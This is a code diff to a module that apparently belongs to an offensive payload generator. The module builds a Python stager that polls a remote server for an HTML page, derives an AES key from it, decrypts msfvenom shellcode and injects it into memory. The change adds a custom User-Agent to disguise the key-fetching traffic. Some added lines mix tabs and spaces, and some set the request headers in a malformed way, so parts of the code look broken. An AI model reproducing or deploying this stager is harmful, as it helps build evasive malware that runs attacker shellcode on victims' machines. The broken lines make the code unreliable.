@@ -31,8 +31,7 @@ required 16 Byte key. Than injects it into memory, and executes it.
 Based off AES encrypt module by @christruncer
 
 module by @KillSwitch-GUI: Alex Rymdeko-Harvey
-
-
+ 
 """
 
 from modules.common import shellcode
@@ -60,8 +59,9 @@ class Payload:
                                     "INJECT_METHOD"  : ["Virtual", "Virtual, Void, Heap"],
                                     "SLEEP_TIME"     : ["60", "Set the sleep time between HTTP Key request"],
                                     "TARGET_SERVER"  : ["http://www.site.com/wordpress.html", "Set target URI path of the decryption key"],
-                                    "HTML_FILE_PATH" : ["/root/Desktop/", "Set the output of HTML file name"]
-                                }
+                                    "HTML_FILE_PATH" : ["/root/Desktop/", "Set the output of HTML file name"],
+				    "USER_AGENT"     : ["Mozilla/4.0", "Set your custom useragent"]
+				 }
 
 
 
@@ -69,6 +69,7 @@ class Payload:
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
                 TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
                 target_html_file = str(TARGET_SERVER.split('/')[-1])
+		USER_AGENT = "'User-agent', '" + self.required_options['USER_AGENT'][0]
 
 
                 # Generate Shellcode Using msfvenom
@@ -153,17 +154,19 @@ class Payload:
                 PayloadCode += 'import os\n'
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
-                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
+                PayloadCode += 'import urllib2\n'
+		PayloadCode += 'opener = urllib2.build_opener()\n'
+		PayloadCode += 'opener.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'
                 # Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n'
+                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -198,6 +201,7 @@ class Payload:
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
                 TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
                 target_html_file = str(TARGET_SERVER.split('/')[-1])
+		USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
@@ -284,17 +288,19 @@ class Payload:
                 PayloadCode += 'import os\n'
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
-                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
-                # Define Target Server "Key hosting server"
+                PayloadCode += 'import urllib2\n'
+		PayloadCode += 'opener = urllib2.build_opener()\n'
+		PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'                
+		# Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n'
+                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -331,6 +337,7 @@ class Payload:
             if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
                 TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
                 target_html_file = str(TARGET_SERVER.split('/')[-1])
+		USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
 
@@ -416,19 +423,21 @@ class Payload:
                 PayloadCode += 'import os\n'
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
-                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
-                PayloadCode += 'from datetime import datetime\n'
+                PayloadCode += 'import urllib2\n'
+		PayloadCode += 'opener = urllib2.build_opener()\n'
+		PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'            
+		PayloadCode += 'from datetime import datetime\n'
                 PayloadCode += 'from datetime import date\n\n'
                 # Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n'
+                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
